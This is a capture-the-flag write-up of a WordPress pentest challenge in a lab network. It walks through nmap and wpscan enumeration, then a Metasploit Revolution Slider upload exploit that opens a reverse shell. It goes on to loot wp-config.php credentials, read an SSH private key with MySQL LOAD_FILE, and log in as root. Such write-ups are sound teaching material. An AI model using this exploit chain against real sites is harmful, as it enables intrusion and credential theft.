This challenge was in the “Network/Pentest” category. CTFs rarely offer pentesting-oriented challenges, so I found this challenge especially enjoyable.

 The challenge description reads:
 <blockquote>
 I setup my own Wordpress site!
 I love that there are so many plugins. My favorite is Revolution Slider.  Even though it's a little old it doesn't show up on wpscan!
 Please give it about 30 seconds after connecting for everything to setup correctly.
 The flag is in /root/flag.txt
 Difficulty: medium
</blockquote>

The challenge provides an OpenVPN config file to use to access the challenge environment. The following command can be used to connect:
<code>openvpn wordpress.ovpn</code>

**Discovery**

After connecting to the VPN environment, the network interface tap0 is created. First, I found the IP address I was given:

<code>
ifconfig tap0
</code>

This returned the address 172.30.0.14, with a subnet mask of 255.255.255.240. To discover other hosts on this subnet to attack, I started by running the following command to perform a ping sweep:

<code>
nmap -sn 172.30.0.0/28
</code>

![Alt text](/images/wordpress_1.png?raw=true "Subnet ping sweep")

This discovered two hosts other than my own machine: 172.30.0.2 and 172.30.0.3. I ran a basic port scan (top 1000 ports) on each host with the following commands:

<code>
nmap 172.30.0.3
</code>

```
(Output, slightly truncated:)
Nmap scan report for 172.30.0.3
Host is up (0.093s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:2E:94:DE:60 (Unknown)
```

<code>
nmap 172.30.0.2
</code>

```
(Output, slightly truncated:)
Nmap scan report for 172.30.0.2
Host is up (0.096s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:78:6B:17:83 (Unknown)
```


This basic port scan indicated that one host was running an SSH server and web server, and the other was running a MySQL server. After running a basic scan, I like to follow up with a more intense scan that peforms service and OS fingerprinting and scans all TCP ports, which helps avoid missing services running on high or non-standard ports. That scan can be peformed with the following command:

<code>
nmap -A $target_ip -p-
</code>

For the sake of brevity, I won't include the output here. I didn't discover any new services with this command, and the version fingerprinting didn't reveal anything shockingly out-of-date. Lastly, I went ahead and ran a UDP scan (top 1000 ports) on each host in the background. This is time-consuming, so I wanted to push ahead with my main enumeration while the scan ran. I used the following command:

<code>
nmap -sU $target_ip
</code>

**Enumeration**

This challenge is entitled “Wordpress”, so I decided to tackle the machine runnning a web server first (172.30.0.3). Upon visiting the server in a web browser, I was greeted by an unassuming WordPress installation. 

![Alt text](/images/wordpress_2.png?raw=true "WordPress site index")

The challenge made mention of wpscan, which is a handy tool for fingerprinting WordPress versions, installed plugins and their versions, determining existing users, and more. I ran a basic scan with the following command:

<code>
wpscan --url "http://172.30.0.3/"
</code>

After a brief moment, the scan completed. 

![Alt text](/images/wordpress_3.png?raw=true "wpscan output")

The most interesting portion of the output was:

```
[i] Plugin(s) Identified:

[+] revslider
 | Location: http://172.30.0.3/wp-content/plugins/revslider/
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WordPress Slider Revolution Local File Disclosure
 |     Fixed in: 4.1.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7540
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579
 |      - https://www.exploit-db.com/exploits/34511/
 |      - https://www.exploit-db.com/exploits/36039/
 |      - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html
 |      - http://packetstormsecurity.com/files/129761/
 |
 | [!] Title: WordPress Slider Revolution Shell Upload
 |     Fixed in: 3.0.96
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7954
 |      - https://www.exploit-db.com/exploits/35385/
 |      - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute
 |
 | The version could not be determined.
```

The challenge made reference to a plugin, and wpscan reports that there are two potential vulnerabilties in this plugin. (Also, the challenge mentioned that the plugin doesn't show up on wpscan, though it clearly does; I'm not sure what that's about. Maybe that was true at the time of the challenge creation and wpscan was updated, or maybe the author was just trolling.) 

**Exploitation**

The Metasploit module listed by wpscan looked promising; to try using that to exploit the plugin, I issued the following commands:

```
service postgresql start
msfconsole
msf > use exploit/unix/webapp/wp_revslider_upload_execute
```

After checking the module info to determine what options to set, I ran the following commands to attempt exploitation:

```
msf exploit(unix/webapp/wp_revslider_upload_execute) > set rhost 172.30.0.3
msf exploit(unix/webapp/wp_revslider_upload_execute) > set payload generic/shell_reverse_tcp
msf exploit(unix/webapp/wp_revslider_upload_execute) > set lhost 172.30.0.14
msf exploit(unix/webapp/wp_revslider_upload_execute) > exploit
```
(The options for this module can be seen in the below screenshot):

![Alt text](/images/wordpress_4.png?raw=true "Metasploit module options")

This returned a shell:


```
[*] Started reverse TCP handler on 172.30.0.14:4444 
[+] Our payload is at: /wp-content/plugins/revslider/temp/update_extract/revslider/TeKbgNb.php
[*] Calling payload...
[*] Command shell session 1 opened (172.30.0.14:4444 -> 172.30.0.3:60076) at 2019-03-02 19:43:20 -0500
[+] Deleted TeKbgNb.php
[+] Deleted ../revslider.zip

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I had access as the www-data user, which is generally expected when exploiting a WordPress plugin or other web application. After gaining access to a machine running WordPress, it's a good idea to loot the wp-config file, as it contains a database password that might be re-used elsewhere.

![Alt text](/images/wordpress_5.png?raw=true "/var/www/ contents")

Upon checking /var/www, in addition to the wp-config file, there's also a non-standard file called note.txt. To view the contents of the file, I ran:

<code>
cat /var/www/note.txt
</code>

<blockquote>
Your ssh key was placed in /backup/id_rsa on the DB server.
</blockquote>

I then grabbed the contents of the wp-config file with:

<code>
cat /var/www/wp-config.php
</code>

The interesting portion of the output is:

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', '0NYa6PBH52y86C');

/** MySQL hostname */
define('DB_HOST', '172.30.0.2');
```

So the database username is “wordpress”, the password is “0NYa6PBH52y86C”, and the database host is not localhost, but 172.30.0.2. I had already discovered this host earlier in my enumeration; the only service it appeared to be running was MySQL. To attempt to log in to this database remotely, I ran the following command from my machine and provided the password I looted from the wp-config file:

<code>
mysql -u wordpress -p -h 172.30.0.2
</code>

![Alt text](/images/wordpress_6.png?raw=true "Connecting to the MySQL server")

An interesting feature of MySQL is the ability to load files and read their contents. Since the note.txt file discovered earlier made reference to a file on the DB server at /backup/id_rsa, I tried loading that file with this command:

<code>
SELECT LOAD_FILE("/backup/id_rsa");
</code>

![Alt text](/images/wordpress_7.png?raw=true "File contents returned")

This returned the contents of the file, which were a private SSH key. I then copied this text, saved it to my machine in a file entitled id_rsa (and cleaned up the formatting), and set its permissions:

<code>
chmod 600 id_rsa
</code>

Since the flag is supposed to be located at /root/flag.txt, and the 172.30.0.3 machine is running an SSH server, I tried to connect to it as root using the stolen SSH key:

<code>
ssh -i id_rsa root@172.30.0.3
</code>

![Alt text](/images/wordpress_8.png?raw=true "Connecting via SSH and grabbing the flag")

This allowed me to successfully SSH to the machine as root and view the flag:

```
root@apacheword:~# cat flag.txt
gigem{w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE}
```
